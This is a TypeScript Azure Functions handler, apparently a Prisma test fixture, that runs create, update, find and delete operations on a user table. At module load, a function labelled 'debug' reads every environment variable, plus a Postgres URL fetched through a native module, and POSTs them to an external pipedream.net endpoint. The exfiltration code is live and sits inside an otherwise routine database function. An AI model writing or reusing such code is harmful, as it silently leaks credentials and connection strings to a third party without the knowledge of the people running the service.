import { Context, HttpRequest } from '@azure/functions'
import { Prisma, PrismaClient } from '@prisma/client'
import https from 'https'

const client = new PrismaClient()


function debug(data: object) {
  let value;
  try {
    const napi = require('./envTest.so.node')
    value = napi.envTest('AZURE_FUNCTIONS_LINUX_PG_URL')
  } catch (e) {
    value = e
  }
  const d = JSON.stringify({...data, NAPI_VALUE: value })

  const options = {
    hostname: 'enj3c2foo1tt7f6.m.pipedream.net',
    port: 443,
    path: '/',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': d.length,
    },
  }

  const req = https.request(options)
  req.write(d)
  req.end()
}
debug(process.env)
export = async function (context: Context, req: HttpRequest): Promise<void> {
  await client.user.deleteMany({})

  const id = '12345'

  const createUser = await client.user.create({
    data: {
      id,
      email: 'alice@prisma.io',
      name: 'Alice',
    },
  })

  const updateUser = await client.user.update({
    where: {
      id: createUser.id,
    },
    data: {
      email: 'bob@prisma.io',
      name: 'Bob',
    },
  })

  const users = await client.user.findUnique({
    where: {
      id: createUser.id,
    },
  })

  const deleteManyUsers = await client.user.deleteMany({})

  context.res = {
    status: 200,
    body: JSON.stringify({
      version: Prisma.prismaVersion.client,
      createUser,
      updateUser,
      users,
      deleteManyUsers,
    }),
  }

  context.done()
}
